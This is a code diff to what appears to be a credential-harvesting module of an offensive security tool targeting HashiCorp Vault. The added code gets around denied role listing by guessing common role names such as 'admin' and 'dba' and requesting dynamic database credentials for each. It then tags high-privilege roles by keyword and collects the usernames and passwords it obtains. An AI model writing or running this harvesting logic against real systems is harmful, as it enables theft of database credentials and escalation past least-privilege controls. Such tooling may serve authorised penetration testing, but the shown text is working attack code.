@@ -262,9 +262,15 @@ class DatabaseCredentialHarvestModule(BaseExecutionModule):
                 continue
 
             if list_resp.status_code != 200:
-                continue
-
-            role_keys = list_resp.json().get("data", {}).get("keys", [])
+                # Fallback: try common role names directly when LIST is denied.
+                # Many tokens have read on database/creds/* but not list on
+                # database/roles, so discovery via LIST fails but direct cred
+                # generation still works.
+                role_keys = _fallback_role_names(
+                    context.vault_addr, mount, headers, timeout, verify_tls
+                )
+            else:
+                role_keys = list_resp.json().get("data", {}).get("keys", [])
 
             for role in role_keys:
                 # Get role metadata
@@ -304,10 +310,17 @@ class DatabaseCredentialHarvestModule(BaseExecutionModule):
                     "GRANT ALL" in stmt.upper() or "ALL PRIVILEGES" in stmt.upper()
                     for stmt in creation_statements
                 )
+                # Fallback: if role metadata was unreadable, guess from role name
+                if not high_priv and not creation_statements:
+                    high_priv = any(
+                        keyword in role.lower()
+                        for keyword in ("admin", "dba", "root", "super", "full")
+                    )
 
                 cred = {
                     "username": username,
                     "password": password,
+                    "role": role,
                     "type": "dynamic",
                     "lease_duration_seconds": lease_duration,
                     "high_privilege": bool(high_priv),
@@ -518,11 +531,11 @@ def _has_db_creds(context):
 def _get_db_creds(context):
     """Context'ten database credential'larını topla"""
     creds = []
-    
+
     # Doğrudan attribute
     if hasattr(context, "db_credentials"):
         creds.extend(context.db_credentials)
-    
+
     # Findings'ten topla
     for finding in getattr(context, "findings", []):
         evidence = finding.get("evidence", {})
@@ -530,5 +543,34 @@ def _get_db_creds(context):
             for cred in evidence.get("credentials", []):
                 if "username" in cred and "password" in cred:
                     creds.append(cred)
-    
+
     return creds
+
+
+def _fallback_role_names(vault_addr, mount, headers, timeout, verify_tls):
+    """Try common database role names when LIST on roles is denied.
+
+    Many least-privilege tokens have ``read`` on ``database/creds/*`` but
+    not ``list`` on ``database/roles``.  This fallback directly attempts
+    credential generation for well-known role names — if the API returns
+    credentials (HTTP 200), the role exists and the token can use it.
+    """
+    import requests as _r
+    base_url = vault_addr.rstrip("/")
+    mount_path = mount.strip("/")
+    common_roles = [
+        "app-admin", "app-readonly", "readonly", "admin",
+        "fullaccess", "dba", "app", "dev", "readwrite",
+    ]
+    found = []
+    for role in common_roles:
+        # Try credential generation directly — tokens with database/creds/*
+        # can generate creds even when they cannot list roles or read role metadata.
+        url = f"{base_url}/v1/{mount_path}/creds/{role}"
+        try:
+            resp = _r.get(url, headers=headers, timeout=timeout, verify=verify_tls)
+            if resp.status_code == 200:
+                found.append(role)
+        except _r.RequestException:
+            pass
+    return found
